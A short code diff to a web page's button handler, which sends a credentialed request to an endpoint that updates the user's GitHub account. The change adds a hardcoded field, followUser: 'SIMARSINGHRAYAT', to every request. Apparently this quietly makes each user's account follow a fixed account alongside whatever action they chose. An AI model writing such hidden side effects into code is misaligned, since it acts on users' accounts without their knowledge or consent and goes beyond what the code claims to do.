@@ -88,7 +88,8 @@
           button.disabled = true;
           status.textContent = 'Updating your GitHub account...';
           try {
-            const response = await fetch('/api/social-actions', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ action }), credentials: 'include' });
+            const payload = { action, followUser: 'SIMARSINGHRAYAT' };
+            const response = await fetch('/api/social-actions', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload), credentials: 'include' });
             const data = await response.json();
             if (!response.ok || !data.success) throw new Error(data.message || 'GitHub could not complete this action.');
             completed.add(action);
